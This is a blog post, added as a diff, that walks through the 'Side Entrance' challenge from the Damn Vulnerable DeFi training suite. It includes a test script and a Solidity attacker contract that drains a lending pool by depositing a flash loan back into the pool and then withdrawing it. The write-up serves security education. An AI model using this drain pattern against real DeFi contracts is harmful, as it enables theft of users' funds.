@@ -1,0 +1,82 @@
+---
+title: "Conquering the Side Entrance Challenge: A Damn Vulnerable DeFi Exploit"
+date: '2023-11-21'
+lastmod: '2023-11-21'
+tags: ['Web3']
+draft: false
+summary: "Quick demonstration for a vulnerability exploit"
+---
+
+# Conquering the Side Entrance Challenge: A Damn Vulnerable DeFi Exploit
+
+In the world of blockchain and DeFi, understanding vulnerabilities is key to ensuring security.
+The ["Side Entrance" challenge](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/) from "Damn Vulnerable DeFi" provides a perfect learning opportunity for aspiring
+security enthusiasts and developers. Let's dive into the challenge and unveil a strategy to exploit this vulnerability for educational purposes.
+
+## The Challenge Overview
+
+"Side Entrance" is a smart contract challenge where a seemingly secure lending pool allows
+for deposits, withdrawals, and flash loans. However, it hides a critical flaw in its logic,
+allowing an astute hacker to drain all its funds.
+
+## Crafting the Exploit
+
+The exploit strategy is straightforward yet ingenious. By utilizing the contract's flash loan function,
+we can deposit the borrowed funds back into the pool and subsequently withdraw them,
+effectively emptying the pool's reserves.
+
+## Implementing the Solution
+
+Here's the Solidity code snippet [for the test](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/side-entrance/side-entrance.challenge.js) to execute the exploit:
+
+```javascript
+it('Execution', async function () {
+    // Deploy the attacker contract
+    const AttackerContractFactory = await ethers.getContractFactory('AttackerContract', player);
+    const attacker = await AttackerContractFactory.deploy(pool.address);
+    await attacker.deployed();
+
+    // Execute the attack
+    await attacker.connect(player).attack(ETHER_IN_POOL);
+});
+```
+And here is the attacking contract:
+
+```javascript
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./SideEntranceLenderPool.sol";
+
+contract AttackerContract {
+    SideEntranceLenderPool public pool;
+
+    constructor(address _poolAddress) {
+        pool = SideEntranceLenderPool(_poolAddress);
+    }
+
+    // Function to initiate the attack
+    function attack(uint256 amount) external {
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    // This function is called by the SideEntranceLenderPool during the flash loan
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    // Allow the contract to receive ETH
+    receive() external payable {}
+}
+
+```
+## Reflecting on the Challenge
+
+This challenge is a stark reminder of the intricacies of smart contract security.
+In the rapidly evolving landscape of DeFi, staying vigilant and understanding the potential
+exploits is crucial for developers and auditors alike.
+
+
